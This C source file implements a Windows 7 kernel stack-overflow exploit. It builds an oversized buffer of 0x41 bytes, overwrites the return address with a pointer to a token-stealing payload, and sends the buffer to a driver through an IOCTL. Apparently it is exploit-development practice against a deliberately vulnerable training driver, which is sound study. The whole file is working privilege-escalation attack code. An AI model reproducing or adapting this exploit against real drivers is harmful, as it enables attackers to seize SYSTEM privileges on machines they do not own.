#include "StackOverflow.h"
#include "Common.h"

BOOLEAN
StackOverflowWin7(VOID)
{
	BOOLEAN bRetValue = FALSE;
	PVOID EopPayload = &TokenStealingPayLoadWin7KernelStub;
	PVOID pvUserModeBuffer = NULL;
	ULONG ulUserModeBuffersize = (BUFFER_SIZE + 0x28 + 4 + 4);
	PVOID pvMemoryAddress = NULL;
	ULONG ulRetBytes = 0;
	
	pvUserModeBuffer = (PVOID)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		ulUserModeBuffersize
	);

	if (NULL == pvUserModeBuffer)
	{
		goto _RET;
	}

	RtlFillMemory((PVOID)pvUserModeBuffer, ulUserModeBuffersize, 0x41);
	pvMemoryAddress = (PVOID)(((ULONG)pvUserModeBuffer + ulUserModeBuffersize) - sizeof(ULONG));
	*(PULONG)pvMemoryAddress = (ULONG)EopPayload;

	SendIOCTL(
		STACK_OVERFLOW_CONTROL_CODE,
		pvUserModeBuffer,
		ulUserModeBuffersize
	);

	bRetValue = TRUE;

_RET:
	if (NULL != pvUserModeBuffer)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)pvUserModeBuffer);
		pvUserModeBuffer = NULL;
	}

	return bRetValue;
}